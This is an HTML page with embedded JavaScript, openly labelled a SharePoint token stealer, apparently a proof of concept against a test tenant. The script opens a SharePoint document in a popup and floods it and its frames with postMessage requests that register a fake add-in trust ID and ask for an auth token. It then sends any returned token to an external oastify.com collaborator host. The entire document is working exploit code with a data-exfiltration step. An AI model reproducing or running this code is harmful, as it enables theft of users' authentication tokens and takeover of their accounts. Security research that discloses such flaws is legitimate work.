<!DOCTYPE html>
<html>
<head> <title>SharePoint Popup Exploit V8</title> </head>
<body>
    <h1>SharePoint Token Stealer (Popup Method)</h1>
    <button onclick="startExploit()">Step 1: Open Target & Attack</button>
    <div id="status">Waiting...</div>
    <div id="log" style="border:1px solid #ccc; padding:10px; margin-top:10px;"></div>

    <script>
        // TARGET CONFIGURATION
        // Use 'embedview' to load the editor directly (avoids nested iframe issues of 'default')
        const targetUrl = "https://shiscolinotests-my.sharepoint.com/personal/shiscolino_shiscolinotests_onmicrosoft_com/_layouts/15/Doc.aspx?sourcedoc={aafd58b8-f1a2-439e-94f0-d4ac217eea09}&action=embedview";
        const targetOrigin = "https://shiscolinotests-my.sharepoint.com";
        const exploitId = "HACKER_POPUP";
        let popup = null;

        function log(msg) {
            document.getElementById("log").innerText += msg + "\n";
            console.log(msg);
        }

        function startExploit() {
            // Open target in a new window (shares session cookies!)
            popup = window.open(targetUrl, "sharepointTarget", "width=800,height=600");
            log("Popup opened. Waiting 5s for load...");

            // Wait for load, then fire
            setTimeout(() => {
                runExploit();
            }, 5000);
        }

        function runExploit() {
            if (!popup) return;
            log("Launching attack...");

            // Helper to send to popup and its subframes (The fix!)
            function send(payload) {
                // 1. Send to Top Window
                try { popup.postMessage(payload, "*"); } catch(e) {}
                try { popup.postMessage(JSON.stringify(payload), "*"); } catch(e) {}

                // 2. Send to All Subframes (The "OfficeApps" Editor is inside an iframe)
                try {
                    for (let i = 0; i < popup.frames.length; i++) {
                        const frame = popup.frames[i];
                        try { frame.postMessage(payload, "*"); } catch(e) {}
                        try { frame.postMessage(JSON.stringify(payload), "*"); } catch(e) {}
                    }
                } catch(e) {
                    log("Warning: Could not access subframes (CORS?)");
                }
            }

            // 1. Register
            send({
                MessageId: "AddinTrustedOrigin",
                AddinTrustId: exploitId
            });

            // 2. Request Token (Keep trying)
            let attempts = 0;
            const interval = setInterval(() => {
                attempts++;
                if (attempts > 10) clearInterval(interval);
                
                // Nesting in "Values" is critical for the dispatcher
                send({
                    MessageId: "GetAuthToken",
                    Values: {
                        AddinTrustId: exploitId,
                        Resource: window.location.origin
                    }
                });
                log("Sent Request Attempt " + attempts);
            }, 1000);
        }

        // 3. Listen for ANY Response
        window.addEventListener("message", (event) => {
            // Filter out unrelated messages (React devtools, etc)
            if (!event.data) return;
            
            // Allow string parsing
            let data = event.data;
            if (typeof data === "string") {
                try { data = JSON.parse(data); } catch(e) {}
            }

            // Check for specific SharePoint response
            if (data.MessageId === "GetAuthTokenResponse") {
                log("RECEIVED RESPONSE: " + JSON.stringify(data));
                
                // DEBUG: Alert the full structure to see where the token is
                alert("RESPONSE RECEIVED!\n" + JSON.stringify(data, null, 2));

                let token = null;
                if (data.Values && data.Values.Token) token = data.Values.Token;
                else if (data.Token) token = data.Token;
                else if (data.Values && data.Values.AccessToken) token = data.Values.AccessToken; // Try alternate name

                if (token) {
                    log("SUCCESS! Token found.");
                    fetch('https://gh172msg2ynnsup0ycblcdwomfs6g24r.oastify.com/?stolen_token=' + encodeURIComponent(token), { mode: 'no-cors' });
                } else {
                    log("ERROR: Message received but Token field is empty or named differently.");
                }
            }
        });
    </script>
</body>
</html>
